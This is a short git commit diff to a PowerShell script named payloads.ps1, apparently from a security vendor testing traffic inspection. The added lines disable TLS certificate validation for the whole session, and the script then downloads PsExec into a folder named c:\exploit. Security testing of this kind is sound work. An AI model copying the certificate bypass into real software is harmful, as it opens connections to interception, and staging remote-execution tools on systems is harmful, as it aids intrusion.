176d42e69dcff718d6f5008dc77ca384fad1fa34
Dolev Attiya <dolev.attiya@catonetworks.com>
2023-07-12 08:45:22 +0300

    fixing inspection

--- payloads.ps1
+++ payloads.ps1
@@ -1,3 +1,17 @@
+add-type @"
+    using System.Net;
+    using System.Security.Cryptography.X509Certificates;
+    public class TrustAllCertsPolicy : ICertificatePolicy {
+        public bool CheckValidationResult(
+            ServicePoint srvPoint, X509Certificate certificate,
+            WebRequest request, int certificateProblem) {
+            return true;
+        }
+    }
+"@
+[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy
+
+
 "Downloading PsExec"
 $staticPath= "c:\exploit"
 $pstoolsUrl = 'https://download.sysinternals.com/files/PSTools.zip'
